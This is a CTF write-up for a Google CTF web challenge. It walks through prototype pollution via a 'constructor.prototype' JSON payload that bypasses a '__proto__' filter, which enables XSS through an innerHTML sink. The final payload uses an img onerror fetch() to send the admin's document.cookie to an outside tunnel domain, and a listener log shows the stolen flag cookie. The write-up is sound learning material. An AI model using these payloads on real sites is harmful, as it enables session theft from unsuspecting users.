# prototype's fall - googlectf - web

The system's defenses are built on flawed foundations. Their inheritance isn't as robust as they believe. To exploit their weakness, don't just corrupt the blueprint; manipulate the very essence of their creation – the constructor itself. Twist its purpose, and watch their reality crumble.

## Methodology

Objective is to send an XSS affected page ot the admin.

To acheive that we need to find some way to modify the page. Inspecting the source yields the following entry point that will allow us to alter the page.

```
// NEXT: Add a child in a safe way. For now, only do this in dev mode.
        if (getEnv().devMode) {
            console.log("append child")
            child = document.createElement('div');
            child.innerHTML = getEnv().safeHTML;
            document.body.appendChild(child)
        }
```

The only problem with this is that the getEnv() function is hardcoded to not have a devMode. But with prototype pollution, we can change the prototype for all objects... including getEnv()

## Prototype pollution

All signs are pointing to prototype pollution. Lets look at the source.

This function yields a prototype pollution entrypoint from a weak sanitization on the config get parameter:

```
// Merges two objects deeply. Because shallow merges are for the well-rested.
        function deepMerge(dest, src) {
            for (let key in src) {
                if (!src.hasOwnProperty(key)) {
                    continue
                }
                if (typeof src[key] !== 'object') {
                    dest[key] = src[key];
                    continue
                } else if (key === '__proto__') { // This input sanitization? Prototype pollution doesn't stand a chance.
                    continue;
                }

                if (!dest[key]) {
                    if (Array.isArray(src[key])) {
                        dest[key] = []
                    } else {
                        dest[key] = {};
                    }
                }
                deepMerge(dest[key], src[key]);
            }
        }

```

If we set the config input to the following, we are able to pollute the prototype:

```
{
  "constructor": {
    "prototype": {
      "devMode": true
    }
  }
}
```

After setting this as the config param we see that the getEnv() function inherited the debugMode property through protoype pollution because the div element was appended to the page.

![debugON](https://github.com/user-attachments/assets/8c5f744f-2785-4a4d-a014-59713edd4824)


Why did getEnv() inherit devMode if we sent the input to the getConfig() function?

__Modifying the prototype modifies the protoype of ALL objects__

## XSS

With the following source, we see that we can write to the page with whatever the getEnv().safeHTML value is:

```
// NEXT: Add a child in a safe way. For now, only do this in dev mode.
        if (getEnv().devMode) {
            console.log("append child")
            child = document.createElement('div');
            child.innerHTML = getEnv().safeHTML;
            document.body.appendChild(child)
        }
```

Adding safeHTML property through prototype pollution:

```
{
  "constructor": {
    "prototype": {
      "devMode": true,
      "safeHTML":"<script>alert()</script>"
    }
  }
}
```

No alert showed up but the script was properly loaded into the page.

Trying the image XSS payload:

```
{
  "constructor": {
    "prototype": {
      "devMode": true,
      "safeHTML":"<img src=x onerror=alert()>"
    }
  }
}
```

Success:

![xss](https://github.com/user-attachments/assets/124c169f-3dd6-4795-b93c-f33d9fb6813f)


## Send to admin

From here we just have to modify the payload to send a fetch request for a domain we control and capture the cookie.

The modified payload that redirects to my domain with a listener:

```
{
  "constructor": {
    "prototype": {
      "devMode": true,
      "safeHTML":"<img src=x onerror=fetch('https://roommate-prescribed-madagascar-mexican.trycloudflare.com/flag='+document.cookie)>"
    }
  }
}
```

The flag:

```

127.0.0.1 - - [28/Feb/2025 14:38:18] "GET /flag=session=CTF%7B__proto__Pirate%7D HTTP/1.1" 200 -


```

# References/Learning

- Prototypes 
	- https://www.w3schools.com/js/js_object_prototypes.asp
	- https://developer.mozilla.org/en-US/docs/Learn_web_development/Extensions/Advanced_JavaScript_objects/Object_prototypes
- Prototype pollution
